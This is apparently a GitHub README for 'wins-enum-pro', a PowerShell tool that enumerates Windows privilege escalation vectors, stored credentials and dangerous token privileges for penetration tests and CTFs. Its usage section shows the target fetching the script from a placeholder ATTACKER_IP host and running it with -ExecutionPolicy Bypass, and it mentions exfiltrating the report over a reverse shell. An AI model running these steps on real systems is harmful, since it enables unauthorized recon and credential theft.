<div align="center">

# wins-enum-pro

**Professional Windows Local Privilege Escalation Enumerator**

[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue?style=flat-square&logo=powershell)](https://docs.microsoft.com/en-us/powershell/)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078d6?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![Version](https://img.shields.io/badge/Version-2.1.0-orange?style=flat-square)](https://github.com/pentesterhelper/wins-enum/releases)
[![Website](https://img.shields.io/badge/Website-pentesterhelper.in-purple?style=flat-square)](https://pentesterhelper.in)

*A comprehensive, single-script Windows privilege escalation checker for penetration testers and CTF players.*

</div>

---

## Overview

`wins-enum-pro` is a PowerShell-based enumeration tool designed to identify common Windows privilege escalation vectors quickly and cleanly. It runs **21 checks** in sequence, outputs colour-coded console results, and saves a full timestamped report to disk — no dependencies, no installations, no internet access required.

Built for use during penetration tests, TryHackMe/HackTheBox rooms, OSCP labs, and red team engagements where you need a fast, reliable local recon sweep.

---

## Features

| Category | Checks |
|---|---|
| **System** | OS version, build, architecture, hardware info |
| **User** | Current user, group memberships, admin status |
| **Privileges** | SeImpersonate, SeDebug, SeBackup, SeTcb and 8 more |
| **Security** | Windows Defender status, AV products, firewall profiles |
| **Network** | Interfaces, DNS, listening ports, ARP cache, hosts file |
| **Services** | Writable binaries, unquoted paths, weak ACLs (accesschk) |
| **Tasks** | Scheduled tasks with writable target binaries |
| **Registry** | Autorun keys, AlwaysInstallElevated, missing binaries |
| **Credentials** | cmdkey, WinSCP, PuTTY, Windows Vault, web.config, .netrc |
| **Files** | Unattend.xml, SAM backups, SSH keys, sysprep files |
| **History** | PowerShell command history, transcript files |
| **DPAPI** | Master key artifacts for offline decryption |
| **Users** | Local accounts, no-password accounts, group members |
| **Processes** | Running processes, SYSTEM procs in non-standard paths |
| **PATH** | Writable directories in system PATH |
| **Folders** | Weak ACLs on Program Files, ProgramData, C:\ |
| **Domain** | Domain trusts, DCs, GPO results |
| **Apps** | Installed applications (both registry hives) |
| **Interesting Files** | Password files, config files, key files, KeePass DBs |

---

## Quick Start

```powershell
# Basic run — output to current directory
powershell -ExecutionPolicy Bypass -File .\wins_enum_pro.ps1

# Save report to a specific folder
.\wins_enum_pro.ps1 -OutputDir C:\Temp

# Suppress [OK] messages — show only findings
.\wins_enum_pro.ps1 -Quiet

# Disable colour (useful for piping or logging)
.\wins_enum_pro.ps1 -NoColor

# Combined
.\wins_enum_pro.ps1 -OutputDir C:\Temp -Quiet -NoColor
```

---

## Parameters

| Parameter | Type | Default | Description |
|---|---|---|---|
| `-OutputDir` | `string` | Current directory | Where to save the `.txt` report |
| `-NoColor` | `switch` | Off | Disable coloured console output |
| `-Quiet` | `switch` | Off | Hide `[OK]` messages; show findings only |

---

## Output

### Console

Findings are printed in real time with severity-coded colours as each check completes:

```
[!!!]  CRITICAL — Running as Administrator
[!!]   HIGH     — Writable service binary: VulnSvc
[!]    MEDIUM   — Unquoted service path: My Custom App
[i]    LOW      — Custom entries in hosts file
[~]    INFO     — accesschk64.exe not found
      [OK]      No writable PATH directories found
```

A summary table is printed at the end:

```
  FINDINGS SUMMARY
  -----------------------------------------------
  CRITICAL :    1
  HIGH     :    4
  MEDIUM   :    3
  LOW      :    1
  INFO     :    1
  -----------------
  TOTAL    :   10
```

### Report File

A full timestamped plain-text report is saved to disk:

```
wins_enum_20250426_143022.txt
```

The report contains all raw command output alongside every finding, making it suitable for inclusion in pentest reports.

---

## Dangerous Privileges Detected

wins-enum-pro flags the following privileges with exploitation context:

| Privilege | Severity | Exploitation Path |
|---|---|---|
| `SeImpersonatePrivilege` | HIGH | PrintSpoofer, GodPotato, RoguePotato |
| `SeAssignPrimaryTokenPrivilege` | HIGH | Token assignment to processes |
| `SeDebugPrivilege` | CRITICAL | LSASS injection, full credential dump |
| `SeBackupPrivilege` | HIGH | Read SAM/SYSTEM/NTDS ignoring ACLs |
| `SeRestorePrivilege` | HIGH | Write any file, DLL planting |
| `SeTakeOwnershipPrivilege` | HIGH | Take ownership of any object |
| `SeLoadDriverPrivilege` | HIGH | Load kernel drivers for code execution |
| `SeTcbPrivilege` | CRITICAL | Create tokens for any user |
| `SeCreateTokenPrivilege` | CRITICAL | Create arbitrary access tokens |
| `SeCreateSymbolicLinkPrivilege` | MEDIUM | File redirection attacks |
| `SeManageVolumePrivilege` | MEDIUM | Volume management operations |
| `SeShutdownPrivilege` | LOW | System shutdown capability |

---

## Optional: accesschk Integration

For **weak service permission** checks (Step 9), place `accesschk64.exe` from [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) alongside the script or at `C:\tools\AccessChk\accesschk64.exe`.

The script will auto-detect it. Without it, service ACL checks are skipped — all other 20 checks still run normally.

```
wins_enum_pro.ps1
accesschk64.exe        <-- optional, place here
```

---

## Requirements

- **PowerShell 5.1 or later** (built into Windows 10/Server 2016+)
- **No admin rights required** to run — the tool checks what it can access as the current user
- No external modules, no internet connection, no installation

---

## Typical Usage Scenarios

**During a CTF / TryHackMe / HackTheBox room:**
```powershell
# Transfer the script to the target, then:
powershell -ExecutionPolicy Bypass -File .\wins_enum_pro.ps1 -Quiet
```

**During a pentest engagement:**
```powershell
# Save a full report for your notes
.\wins_enum_pro.ps1 -OutputDir C:\Users\Public -NoColor
```

**Over a reverse shell with limited terminal:**
```powershell
.\wins_enum_pro.ps1 -NoColor -Quiet -OutputDir C:\Temp
# Then exfiltrate the .txt report
```

**Transferring the script to a target:**
```powershell
# On attacker machine (Python HTTP server):
python3 -m http.server 8080

# On target:
iwr http://ATTACKER_IP:8080/wins_enum_pro.ps1 -OutFile wins_enum_pro.ps1
powershell -ExecutionPolicy Bypass -File .\wins_enum_pro.ps1
```

---

## Checks Reference

| # | Check | What It Looks For |
|---|---|---|
| 1 | System Information | OS, build, architecture, hardware |
| 2 | Current User & Groups | `whoami /all`, admin membership |
| 3 | Privilege Analysis | Dangerous token privileges |
| 4 | Security Products | AV, Defender status, exclusions, firewall |
| 5 | Network Information | IPs, DNS, open ports, hosts file |
| 6 | Scheduled Tasks | Tasks whose binaries are world-writable |
| 7 | Service Binary Perms | Services with writable executable paths |
| 8 | Unquoted Service Paths | Services with spaces and no quotes in path |
| 9 | Weak Service Perms | Service ACLs via accesschk (if available) |
| 10 | Registry Autoruns | Run/RunOnce keys, AlwaysInstallElevated |
| 11 | Installed Applications | Software inventory from both registry hives |
| 12 | Sensitive Files | Unattend.xml, SAM backups, SSH keys |
| 13 | PowerShell History | Credential keywords in PSReadLine history |
| 14 | Stored Credentials | cmdkey, WinSCP, PuTTY, Vault, web.config |
| 15 | DPAPI Artifacts | Master keys for offline decryption |
| 16 | Active Sessions & Users | Logged-on users, accounts with no passwords |
| 17 | Running Processes | Process list, SYSTEM procs in odd paths |
| 18 | PATH Hijacking | Writable directories in `%PATH%` |
| 19 | Weak Folder Perms | ACLs on Program Files, ProgramData, C:\ |
| 20 | Domain Information | Trusts, DCs, GPO results |
| 21 | Interesting Files | Files matching credential/key patterns |

---

## Notes

- `$ErrorActionPreference` is set to `SilentlyContinue` — errors are suppressed to avoid noise on restricted systems
- The script does **not** attempt any exploitation — enumeration only
- All findings include a reference link where an exploitation path is documented

---

## Author

**pentesterhelper**
- Website: [pentesterhelper.in](https://pentesterhelper.in)
- GitHub: [github.com/pentesterhelper](https://github.com/pentesterhelper)

---

## License

This project is licensed under the [MIT License](LICENSE).

---

## Disclaimer

> This tool is intended for **authorised security testing only**. Only run it on systems you own or have explicit written permission to test. The author accepts no liability for misuse.
